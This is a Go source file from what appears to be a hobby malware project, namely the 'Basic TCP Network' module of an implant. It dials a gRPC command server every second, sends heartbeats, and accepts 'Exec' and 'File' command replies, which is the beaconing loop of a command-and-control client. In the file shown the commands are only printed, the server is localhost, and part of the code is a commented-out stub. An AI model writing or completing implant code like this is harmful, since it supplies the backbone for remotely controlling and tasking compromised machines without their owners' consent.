package basic_tcp_network

import (
	"context"
	"fmt"
	"log"
	"malware/common"
	pb "malware/common/messages"
	"malware/common/types"
	"time"

	"google.golang.org/grpc"
)

type state struct {
	running      bool
	eventChannel chan types.Event
	grpc         *grpc.Server
}

type settings struct {
	state *state
	host  string
}

func (settings settings) doConnection(conn *grpc.ClientConn) {
	client := pb.NewMalwareClient(conn)
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	heartbeat := &pb.CheckCmdRequest_Heartbeat{Heartbeat: time.Now().Unix()}

	reply, err := client.CheckCommandQueue(ctx, &pb.CheckCmdRequest{Message: heartbeat})
	if err != nil {
		common.Panicf(err, "Sending heartbeat help broken")
	}

	switch u := reply.Message.(type) {
	case *pb.CheckCmdReply_Heartbeat:
		fmt.Println("Heartbeat", u.Heartbeat)
	case *pb.CheckCmdReply_Exec:
		fmt.Println("Exec reply", u.Exec)
	case *pb.CheckCmdReply_File:
		fmt.Println("Received file", u.File)
	default:
		common.Panic("Didn't receive a valid message", reply, u)
	}

}

func (settings settings) listenServer() {
	conn, err := grpc.Dial(settings.host, grpc.WithInsecure())
	if err != nil {
		log.Fatalf("fail to dial: %v", err)
	}

	defer conn.Close()

	for settings.state.running {
		settings.doConnection(conn)

		time.Sleep(1 * time.Second)
	}
}

func (settings settings) runEvents() {
	for settings.state.running {
		message := <-settings.state.eventChannel

		switch message.(type) {
		// case sendText:
		// 	// TODO: Some serialization of somethn
		// 	fmt.Fprintf(settings.state.conn, cmd.text)
		// 	if status, err := bufio.NewReader(settings.state.conn).ReadString('\x00'); err == nil {
		// 		fmt.Println(status)
		// 	}

		// 	fmt.Println(cmd)
		default:
			common.Panicf(nil, "Didn't receive SendText type, %s is type %T", message, message)
		}

		// DEBUG
		settings.state.eventChannel <- ""
	}
}

func Create() types.Module {
	port := int16(2000)
	ip := "127.0.0.1"
	state := state{eventChannel: nil}
	host := fmt.Sprintf("%s:%d", ip, port)

	return settings{&state, host}
}

func (settings settings) Init() chan types.Event {
	settings.state.eventChannel = make(chan types.Event, 1)
	settings.state.running = true

	go settings.listenServer()
	go settings.runEvents()

	return settings.state.eventChannel
}

func (settings settings) Shutdown() {
	settings.state.running = false
}

func (settings) ID() string { return "Basic TCP Network" }
